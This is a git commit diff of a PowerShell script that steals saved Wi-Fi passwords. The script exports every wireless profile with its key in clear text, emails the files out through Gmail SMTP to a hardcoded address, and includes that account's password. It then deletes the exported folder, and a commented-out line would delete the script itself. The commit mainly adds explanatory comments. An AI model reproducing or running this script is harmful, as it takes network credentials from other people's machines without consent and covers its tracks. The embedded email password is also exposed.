e996e63473daf4c87e1ff8bdb74e69b389f25f1b
Zmk55 <oreoboi@gmail.com>
2022-08-25 17:32:03 -0500

    Update WiFiCreds.ps1

--- WiFiCreds.ps1
+++ WiFiCreds.ps1
@@ -1,9 +1,13 @@
+#create directory
 mkdir .creds
+
+#send wifi Profiles to directory
 netsh wlan export profile folder= .creds key=clear
 
+#Use email to send files
 $From = "KiddyTheScript@gmail.com"
 $To = "KiddyTheScript@gmail.com"
-$Attachment = (get-childitem ".\.creds").fullname
+$Attachment = (get-childitem ".\.creds").fullname #adds each file in .creds folder to attachment variable
 $Subject = "creds"
 $Body = "Meow Meow"
 $SMTPServer = "smtp.gmail.com"
@@ -12,6 +16,8 @@ $secpasswd = ConvertTo-SecureString "rhznsrbplaffeeao" -AsPlainText -Force
 $cred = New-Object System.Management.Automation.PSCredential ("KiddyTheScript@gmail.com", $secpasswd)
 Send-MailMessage -SmtpServer smtp.gmail.com -port 587 -Credential $cred -UseSsl -From $from -To $To -Subject $Subject -Attachments $Attachment -Body $Body
 
-rm -r .creds
+#Delete folder
+del -r .creds
 
+#Self Destruct Script from pc
 #Remove-Item WiFiCreds.ps1 -Force 
